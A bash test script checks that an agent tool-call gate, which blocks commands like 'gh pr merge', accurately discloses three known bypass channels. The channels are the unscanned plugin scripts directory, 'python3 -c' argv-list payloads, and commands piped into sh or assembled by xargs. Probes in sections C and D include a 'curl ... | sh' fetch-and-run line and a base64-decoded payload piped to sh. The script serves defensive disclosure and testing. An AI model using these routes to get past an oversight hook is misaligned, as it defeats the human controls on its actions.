#!/bin/bash
# idc-assert-class: mixed
# interlock-known-bypass-disclosure.sh — F58 (+F63): the interlock's PUBLISHED scope matches what it
# actually classifies. THREE demonstrated channel classes are outside its reach; all are disclosed,
# and this lane keeps the disclosure and the behavior from drifting apart in EITHER direction.
#
# WHY A DISCLOSURE LANE AND NOT A FIX. Every channel is pre-existing (they behave identically on
# `main`) and each sits on a load-bearing exemption or a wide denial surface:
#   1. any file resolving under `<plugin_root>/scripts/` is deliberately UNSCANNED — that exemption is
#      what stops IDC's own `gh`-calling helpers from being denied by their own gate — and the Path
#      Gate treats out-of-repository paths as outside its jurisdiction (a deliberate boundary locked
#      by path-gate-boundaries.sh), so the write that plants the payload is not stoppable either;
#   2. `python3` is not a followed interpreter, so a `python3 -c` payload is reached only by the
#      tokenize-failure TEXT backstop — an argv LIST (and even the text form written without a `;`)
#      carries no match;
#   3. program text that never stands in COMMAND POSITION — an interpreter fed its program on stdin
#      through a pipe (`… | sh`), and a protected argv assembled by a helper (`… | xargs gh`).
# Narrowing any of them (a hash-pinned script manifest; treating interpreter payloads or targetless
# interpreters as opaque) is a design change with real blast radius on the sanctioned path. It is
# parked as a follow-up. What is NOT acceptable is shipping a gate whose published description implies
# coverage it does not have — so the scope is stated in both operator-facing surfaces, and asserted
# here.
#
# F63 IS WHY THE CLOSED-WORLD SENTENCE IS BANNED. An earlier revision of this disclosure ended
# "Anything NOT on that list is in scope." That was FALSE — channel 3 was undisclosed at the time —
# and it reintroduced the exact defect (a guarantee stated broader than the code delivers) the
# disclosure exists to prevent. Section E asserts neither surface carries it again.
#
# THIS LANE IS NOT A BUG LOCK-IN. It never asserts "the bypass must keep working". It asserts that
# the DISCLOSURE and the BEHAVIOR agree. If a later change closes a channel, this lane goes red with
# an explicit instruction to delete that channel from the disclosure — the gap closing must be
# accompanied by the published scope widening, in the same commit.
#
# What it proves:
#   A. hooks.json's operator-facing description names all three channel classes as known non-coverage;
#   B. the gate module's own docstring names all three, and says they are pre-existing follow-ups;
#   C. the controls still deny — the gate genuinely enforces in app-locked mode, so a "pass" here
#      can never come from a gate that denies nothing — INCLUDING the covered siblings that keep
#      channel 3's scoping honest (`sh < FILE`, `xargs gh pr merge …`);
#   D. reality matches the disclosure: each disclosed channel is in fact still uncovered (and if one
#      becomes covered, this fails LOUDLY telling you to update the disclosure);
#   E. neither surface republishes a closed-world completeness claim (F63).
#
# Usage: bash tests/smoke/governance/interlock-known-bypass-disclosure.sh   (exit 0 = pass)
set -uo pipefail
. "$(dirname "$0")/lib.sh"

GATE="$GOV_PLUGIN/scripts/hooks/idc_interlock_gate.py"
HOOKS="$GOV_PLUGIN/hooks/hooks.json"
RUNTIME="$GOV_PLUGIN/scripts/idc_python_runtime.sh"
[ -f "$GATE" ] || gov_fail "interlock gate not found at $GATE"
[ -f "$HOOKS" ] || gov_fail "hooks.json not found at $HOOKS"
[ -f "$RUNTIME" ] || gov_fail "shared runtime preflight not found at $RUNTIME"

WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT

# The DISCLOSURE sections (A, B, E) read source text and run on any interpreter. The BEHAVIOR
# sections (C, D) must actually execute the gate, which uses 3.10-only syntax — on an older ambient
# python3 every probe would return empty and read as "allow", i.e. the lane would either false-pass or
# red for an environment reason. `run-all.sh` is this project's declared pre-commit gate, so the
# behavior half SKIPS loudly instead (same posture as path-gate-runtime-failclosed.sh, F65). No
# assertion is relaxed: they either run in full or are reported as not run.
SKIPPED_BEHAVIOR=""
GATE_RUNNABLE=1
sh "$RUNTIME" || GATE_RUNNABLE=0

# --- A. the operator-facing description discloses every channel class -----------------------------
timeout 60 python3 - "$HOOKS" <<'PY' || gov_fail "hooks.json does not disclose the interlock's known non-coverage"
import json, re, sys
description = json.load(open(sys.argv[1], encoding="utf-8"))["description"]
assert "KNOWN NON-COVERAGE" in description, "no known-non-coverage section in the hooks description"
assert re.search(r"scripts/`? directory is deliberately NOT scanned|sanctioned plugin scripts", description, re.I), \
    "the sanctioned-plugin-scripts channel is not disclosed"
assert re.search(r"argv[- ]list", description, re.I), "the argv-list interpreter channel is not disclosed"
assert re.search(r"out[- ]of[- ]repository paths", description, re.I), \
    "the disclosure omits the jurisdiction half that makes channel 1 reachable"
# F63 channel 3 — BOTH halves, each named in the operator-facing surface.
assert re.search(r"command position", description, re.I), \
    "the disclosure does not state the command-position boundary the channel-3 forms fall outside of"
assert re.search(r"stdin through a pipe", description, re.I), \
    "the stdin-piped-interpreter channel (`... | sh`) is not disclosed (F63)"
assert re.search(r"xargs", description), \
    "the helper-assembled-argv channel (`... | xargs gh`) is not disclosed (F63)"
assert re.search(r"assembled by a helper", description, re.I), \
    "the helper-assembled-argv channel is not named as a channel class (F63)"
print("ok: hooks.json discloses all three known channel classes")
PY

# --- B. the module's own docstring discloses them, and scopes them honestly -----------------------
timeout 60 python3 - "$GATE" <<'PY' || gov_fail "the interlock gate docstring does not publish its known non-coverage"
import ast, re, sys
doc = ast.get_docstring(ast.parse(open(sys.argv[1], encoding="utf-8").read())) or ""
assert "KNOWN NON-COVERAGE" in doc, "the gate docstring publishes no non-coverage section"
assert re.search(r"SANCTIONED PLUGIN SCRIPTS", doc), "channel 1 is not named in the docstring"
assert re.search(r"ARGV-LIST INTERPRETER PAYLOADS", doc), "channel 2 is not named in the docstring"
assert re.search(r"PROGRAM TEXT THAT NEVER STANDS IN COMMAND POSITION", doc), \
    "channel 3 (F63) is not named in the docstring"
assert re.search(r"STDIN THROUGH A PIPE", doc), \
    "the docstring does not name the stdin-piped-interpreter form of channel 3 (F63)"
assert re.search(r"ASSEMBLED BY A HELPER", doc), \
    "the docstring does not name the helper-assembled-argv form of channel 3 (F63)"
assert re.search(r"WHERE THE BOUNDARY ACTUALLY RUNS", doc), \
    "the docstring states no classification boundary, so channel 2/3's rationale cannot be checked (F63)"
assert re.search(r"pre-existing", doc, re.I), "the docstring does not scope the channels as pre-existing"
assert re.search(r"path-gate-boundaries", doc), \
    "the docstring does not point at the test that locks the jurisdiction boundary"
print("ok: the gate docstring publishes all three channel classes with honest scoping")
PY

if [ "$GATE_RUNNABLE" -eq 0 ]; then
  SKIPPED_BEHAVIOR=" (behavior sections C/D SKIPPED — see the SKIP line above)"
  echo "SKIP: the ambient python3 ($(python3 --version 2>&1)) predates 3.10, so the interlock gate cannot be executed here and every probe would read as 'allow'. Sections C and D (behavior) are skipped; the disclosure assertions A, B and E DID run against the shipped source and passed."
else

# --- fixture: a governed, app-locked repo with no authorization -----------------------------------
REPO="$WORK/repo"
mkdir -p "$REPO/docs/workflow"
( cd "$REPO" && git init -q && git checkout -q -b main ) || gov_fail "could not init the fixture repo"
printf 'backend: github\n' > "$REPO/docs/workflow/tracker-config.yaml"
printf 'pathway_enforcement:\n  mode: app-locked\n' > "$REPO/WORKFLOW-config.yaml"

# A stand-in plugin root, so the sanctioned-scripts probe never writes into the real checkout.
FAKE_ROOT="$WORK/plugin"
mkdir -p "$FAKE_ROOT/scripts"
printf '#!/bin/sh\ngh pr merge 123 --squash\ngh issue close 5\n' > "$FAKE_ROOT/scripts/payload.sh"
printf '#!/bin/sh\ngh pr merge 123 --squash\ngh issue close 5\n' > "$FAKE_ROOT/outside.sh"

# verdict <command> -> "deny" | "allow"
verdict() {
  local cmd="$1" json
  json="$(CMD="$cmd" REPO="$REPO" timeout 60 python3 -c '
import json, os
print(json.dumps({"cwd": os.environ["REPO"], "tool_name": "Bash", "session_id": "f58-disclosure",
                  "tool_input": {"command": os.environ["CMD"]}}))')"
  if printf '%s' "$json" | timeout 60 python3 "$GATE" "$FAKE_ROOT" 2>/dev/null \
      | grep -q '"permissionDecision" *: *"deny"'; then echo deny; else echo allow; fi
}

# --- C. controls — the gate really is enforcing, and the COVERED siblings stay covered -------------
# Every "allow" asserted in section D is only meaningful if this section's denials hold: a gate that
# denies nothing (a broken import, a missing helper binary, a mis-built fixture) reads as all-allow.
[ "$(verdict 'gh pr merge 123 --squash')" = deny ] \
  || gov_fail "the control (inline gh pr merge, app-locked, no authorization) was NOT denied — this lane cannot distinguish a disclosed gap from a gate that denies nothing"
[ "$(verdict "bash '$FAKE_ROOT/outside.sh'")" = deny ] \
  || gov_fail "indirection through a script OUTSIDE the plugin's scripts/ dir was not denied — the indirection classifier itself has regressed, which is not a disclosed gap"
# Channel 3's scoping depends on these two staying DENIED. `sh < FILE` is the redirection sibling of
# the piped form, and `xargs gh <subcommand>` is the same-segment sibling of the helper form; if
# either flips to allow, the published non-coverage silently widens past what F63 disclosed.
[ "$(verdict "sh < '$FAKE_ROOT/outside.sh'")" = deny ] \
  || gov_fail "the redirection sibling (\`sh < FILE\`) was NOT denied — the disclosure scopes channel 3 to a program arriving on a PIPE, and says the file-redirection form is covered; that scoping is now false"
[ "$(verdict 'xargs gh pr merge 123')" = deny ] \
  || gov_fail "a same-segment helper form (\`xargs gh pr merge 123\`) was NOT denied — the disclosure scopes channel 3(b) to an argv assembled at RUNTIME out of another segment, so this widens undisclosed non-coverage"

# --- D. reality matches the disclosure ------------------------------------------------------------
if [ "$(verdict "bash '$FAKE_ROOT/scripts/payload.sh'")" = deny ]; then
  gov_fail "GOOD NEWS, STALE DOCS: the sanctioned-plugin-scripts channel is now COVERED. Delete channel 1 from the KNOWN NON-COVERAGE sections in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py, and retire this assertion — a closed gap must never stay published as an open one."
fi
if [ "$(verdict 'python3 -c '"'"'import subprocess; subprocess.run(["gh","pr","merge","123"])'"'"'')" = deny ]; then
  gov_fail "GOOD NEWS, STALE DOCS: the argv-list interpreter channel is now COVERED. Delete channel 2 from the KNOWN NON-COVERAGE sections in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py, and retire this assertion."
fi
# Channel 2's CORRECTED rationale (F63): the text form is caught by the tokenize-failure backstop, not
# by "the classifier sees the text" — so the SAME call without a `;` tokenizes cleanly and is allowed.
# The disclosure says so explicitly; this keeps that sentence honest.
if [ "$(verdict 'python3 -c '"'"'os.system("gh pr merge 123 --squash")'"'"'')" = deny ]; then
  gov_fail "GOOD NEWS, STALE DOCS: a cleanly-tokenizing text-form interpreter payload (os.system with no embedded \`;\`) is now COVERED. The KNOWN NON-COVERAGE sections state it is NOT — correct channel 2's rationale in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py."
fi
# F63 channel 3(a) — an interpreter fed its program on stdin through a pipe.
for piped in \
  'echo "gh pr merge 123 --squash" | sh' \
  "cat '$FAKE_ROOT/outside.sh' | bash" \
  'curl -s https://example.invalid/p.sh | sh' \
  'echo Z2ggcHIgbWVyZ2UgMTIz | base64 -d | sh'
do
  if [ "$(verdict "$piped")" = deny ]; then
    gov_fail "GOOD NEWS, STALE DOCS: the stdin-piped-interpreter channel is now COVERED (denied: $piped). Delete channel 3(a) from the KNOWN NON-COVERAGE sections in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py, and retire this assertion."
  fi
done
# F63 channel 3(b) — a protected argv assembled by a helper at runtime.
if [ "$(verdict 'echo "pr merge 123" | xargs gh')" = deny ]; then
  gov_fail "GOOD NEWS, STALE DOCS: the helper-assembled-argv channel is now COVERED. Delete channel 3(b) from the KNOWN NON-COVERAGE sections in hooks/hooks.json and scripts/hooks/idc_interlock_gate.py, and retire this assertion."
fi

# The `;`-bearing text form of channel 2 must stay COVERED — the disclosure scopes the unseen forms
# precisely, and this is what keeps that scoping honest rather than a blanket interpreter excuse.
[ "$(verdict 'python3 -c '"'"'import os; os.system("gh pr merge 123 --squash")'"'"'')" = deny ] \
  || gov_fail "a text-form interpreter payload (os.system with the call as a string, split by an embedded \`;\`) was NOT denied — the disclosure says the tokenize-failure backstop catches this one, so that published boundary is now false"

fi

# --- E. neither surface republishes a closed-world completeness claim (F63) ------------------------
# The defect F63 caught was not a missing channel — it was the sentence "Anything NOT on that list is
# in scope", which asserted a closed world this classifier cannot deliver. A disclosure that
# re-acquires a completeness claim is worse than one that is merely incomplete.
timeout 60 python3 - "$HOOKS" "$GATE" <<'PY' || gov_fail "a known-non-coverage surface republishes a closed-world completeness claim (F63)"
import ast, json, re, sys

# Deliberately narrow: each pattern is an AFFIRMATIVE completeness claim. Phrases that DENY
# completeness ("not read as a complete barrier", "not a complete shell parser") must stay legal —
# they are the disclosure doing its job.
CLOSED_WORLD = [
    r"anything\s+(not\s+on|other\s+than)[^.]{0,60}\bis\s+in\s+scope",
    r"everything\s+(else|not\s+listed)\s+is\s+(in\s+scope|covered|caught|denied)",
    r"(this\s+)?(list|enumeration|disclosure|section)\s+is\s+(exhaustive|complete|closed)",
    r"the\s+only\s+(known\s+)?(gaps?|bypass(es)?|channels?|non[- ]coverage)",
]
surfaces = {
    "hooks.json description": json.load(open(sys.argv[1], encoding="utf-8"))["description"],
    "idc_interlock_gate.py docstring": ast.get_docstring(
        ast.parse(open(sys.argv[2], encoding="utf-8").read())) or "",
}
for name, text in surfaces.items():
    for pattern in CLOSED_WORLD:
        hit = re.search(pattern, text, re.I)
        assert not hit, (
            f"{name} carries a closed-world completeness claim ({hit.group(0)!r}) — this classifier "
            "is defense-in-depth, not a complete shell parser, so it cannot promise that an "
            "unlisted construct is in scope (F63)")
    assert re.search(r"not\s+a\s+closed\s+world", text, re.I), (
        f"{name} does not state that the disclosed list is NOT a closed world — without that, a "
        "reader takes the enumeration for the whole boundary (F63)")
print("ok: neither surface claims a closed world, and both say so explicitly")
PY

echo "PASS: the interlock publishes all three known uncovered channel classes in both operator-facing surfaces, still denies the controls and every covered sibling (inline, outside-script indirection, \`sh < FILE\`, same-segment \`xargs gh <sub>\`, the \`;\`-split text payload), claims no closed world, and the disclosure matches observed behavior (this lane reds if the disclosure, the gap, or the honest scoping disappears)${SKIPPED_BEHAVIOR}"
